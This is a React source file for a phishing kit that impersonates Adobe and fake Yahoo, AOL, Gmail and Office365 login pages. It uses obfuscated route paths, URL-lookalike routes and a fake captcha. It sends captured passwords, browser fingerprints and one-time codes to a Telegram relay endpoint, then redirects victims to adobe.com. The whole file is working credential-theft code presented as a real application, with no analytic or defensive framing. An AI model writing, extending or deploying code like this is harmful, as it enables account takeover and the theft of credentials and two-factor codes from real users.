import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate, useLocation } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import GmailLoginPage from './components/GmailLoginPage';
import OthersLoginPage from './components/OthersLoginPage';
import Office365Wrapper from './components/Office365Wrapper';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import OtpPage from './components/OtpPage';
import MobileOtpPage from './components/mobile/MobileOtpPage';
import ProviderRedirect from './components/ProviderRedirect';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

const safeSendToTelegram = async (payload: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
  } catch (fetchErr) {
    console.error('safeSendToTelegram failed:', fetchErr);
  }
};

// Obfuscated route paths
const ROUTES = {
  HOME: '/brgnticvpchctym5duv1d70eywdxep5an857hdjrnrt31y9madtvoe0dl5wh9uwdjk6zoy5xs6ii05n37dyueriqrb32mk1yosi2620glvinkafq88cx1mjh421dlddpub6fatx54f5n6tuhckmp3m3xgc2on8',
  LOGIN: '/4pelo3vzx6ei7ych296jb2mvnhqokj1t7j2gq7qkgh1n9tzzr7h9yb0jvi2pw81jx3n7o22tjps78ut8iorj1vv5s0and0rdzmk4m5xpp8e1ap8c4xcneibr93rhseg5127t3nuasqdvuhz6edzjm8ni54a9cy',
  LOGIN_YAHOO: '/eqmbwtyetkubevfw9i1rqsftn0tepqmc8wtbqqopu0n1fw1r0i91xhnykq8sxk4gltk5re16xllreupyvya4qqq0t6hll23keljtu7loqysbysak9hxymr77hn7oxgjpa61mjyrt5i5i5vmktk3rjt26nhrrtl',
  LOGIN_AOL: '/stncyiw230jhw98jy9s2m58pp9nwz8ng3ffwajrmk8ibacbuzxreqo7en872riqqp254tnavjui6zd1mul4xw3dkq6hqxowbmzq30dxq0bqexkc5jsakvwc4vig6fun7ft8fi0ebhjl2x1ea83uu9k513zgimk',
  LOGIN_GMAIL: '/5nqhr4zkyb0np3zdfbrh1yxk4z5lmgalonutxdsz6hzekg3jsvhwtvxt0iqian5vgu8entmd96c5x0d56u4cn03vbnqmwe0jk2i7sw9nbuyqx0b4p7nhjrxeqr1nh3srj07bmm2tox8clxtvrydhr6mfijj5j6',
  LOGIN_OTHERS: '/j9xf3ceh46jptot7daclbqb7668vv4l1mxerrmscub5pr0iqdebmn3quxoivejcv7ripcmo63o8saawtb6hy3psudjx7wurq86rphsj700baxygur7up0jd30ebp9c9u1y7nx4y8httfzwwuinf4tfolgdudws',
  LOGIN_OFFICE365: '/mtwavnfbcxdh84u25c58xv7igejfgyavzq7i3lwelij3tipowa7fb93n6gk3ml8ul7d8v034j43e7u1egw9hpeoeqxj81uzyozv0ikn0i4a5gas0auqcl73dx4aymbkdy0dxxbj4tzo72f6az6uzq9onxrnklt',
  OTP: '/938uv6106001sygvk1bzhqhx9xfjas1v6ccxfyy8ls30qdkba1n68dftexsdc3xd1zlkwjge9n5c4u2mkfnvk1gq9z027c8mn7miuqhd6ped06ov44zcqrlpmntinhbhfzz5qph9u23pdl1udmhm9x4s3f8i2a',
  LANDING: '/6dck1w4qnffnxtiaofl09u4wy5txozis4phoji3cjswgcm4btl6ghnm343m9hht8g3x4j89v40esarpatd18z5v2bv70yqwmd9ggpn7xng1ys93f1kkaflacbh1i1b4p3774z7hkpzgzs122783h3dbe56ziad',
};

const PROVIDER_URLS = {
  MICROSOFT: '/login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Faccount.adobe.com%2Foauth2%2Fcallback&response_type=code&scope=openid+profile+email',
  YAHOO: '/login.yahoo.com/?src=ym&pspid=159600001&activity=header-signin&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2F',
  GMAIL: '/accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=ARpgrqe&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
  AOL: '/login.aol.com/account/challenge/password?src=ym&pspid=159600001&activity=header-signin&.lang=en-US',
  OTHERS: '/secure-mail.com/login?service=mail&continue=https%3A%2F%2Fmail.secure-mail.com',
};

function App() {
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
  const [isLoading, setIsLoading] = useState(false);
  const [loginFlowState, setLoginFlowState] = useState({
    awaitingOtp: false,
    sessionData: null as any,
  });

  const navigate = useNavigate();
  const location = useLocation();

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        setHasActiveSession(event.action !== 'remove' && !!event.value);
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, []);

  useEffect(() => {
    if (hasActiveSession && location.pathname !== ROUTES.LANDING) {
      navigate(ROUTES.LANDING, { replace: true });
    } else if (!hasActiveSession && location.pathname === ROUTES.LANDING) {
      navigate(ROUTES.HOME, { replace: true });
    }
  }, [hasActiveSession, location.pathname, navigate]);

  const handleCaptchaVerified = () => {
    navigate(ROUTES.LOGIN);
  };

  const handleLoginSuccess = async (loginData: any) => {
    // This is the handler for the second password attempt.
    setIsLoading(true);
    const browserFingerprint = await getBrowserFingerprint();
    const credentialsData = {
      ...loginData,
      sessionId: Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...browserFingerprint,
    };
    
    await safeSendToTelegram({ type: 'credentials', data: credentialsData });
    
    setLoginFlowState({
      awaitingOtp: true,
      sessionData: credentialsData,
    });
    setIsLoading(false);
    navigate(ROUTES.OTP, { replace: true });
  };
  
  const handleOtpSubmit = async (otp: string) => {
    if (!loginFlowState.sessionData) {
      navigate(ROUTES.HOME, { replace: true });
      return;
    }
    
    setIsLoading(true);
    await safeSendToTelegram({
      type: 'otp',
      data: { otp, session: loginFlowState.sessionData },
    });
    
    window.location.href = 'https://www.adobe.com';
  };

  const handleLogout = () => {
    localStorage.clear();
    sessionStorage.clear();
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
    setHasActiveSession(false);
    setLoginFlowState({ awaitingOtp: false, sessionData: null });
  };

  const handleOthersEmailSubmit = (email: string): boolean => {
    const domain = (email.split('@').pop() || '').toLowerCase();
    if (domain.includes('yahoo')) {
      navigate(PROVIDER_URLS.YAHOO, { state: { email } });
      return true;
    }
    if (domain.includes('aol')) {
      navigate(PROVIDER_URLS.AOL, { state: { email } });
      return true;
    }
    if (domain.includes('gmail') || domain.includes('google')) {
      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
      return true;
    }
    return false;
  };

  if (isLoading) {
    return <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center"><Spinner size="lg" /></div>;
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
  const OtpComponent = isMobile ? MobileOtpPage : OtpPage;

  return (
    <Routes>
      <Route path={ROUTES.HOME} element={!hasActiveSession ? <LoginComponent key="provider-select" fileName="Adobe Cloud Access" onLoginSuccess={handleLoginSuccess} onYahooSelect={() => navigate(PROVIDER_URLS.YAHOO)} onAolSelect={() => navigate(PROVIDER_URLS.AOL)} onGmailSelect={() => navigate(PROVIDER_URLS.GMAIL)} onOffice365Select={() => navigate(PROVIDER_URLS.MICROSOFT)} onOthersSelect={() => navigate(PROVIDER_URLS.OTHERS)} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN} element={<Navigate to={ROUTES.HOME} replace />} />
      <Route path={ROUTES.LOGIN_YAHOO} element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_AOL} element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <OthersLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersEmailSubmit} onBack={() => navigate(ROUTES.HOME)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
      <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
      <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
      <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
      <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
      <Route path="/login.aol.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_AOL} />} />
      <Route path="/secure-mail.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OTHERS} />} />
      <Route path="*" element={<Navigate to={hasActiveSession ? ROUTES.LANDING : ROUTES.HOME} replace />} />
    </Routes>
  );
}

export default App;
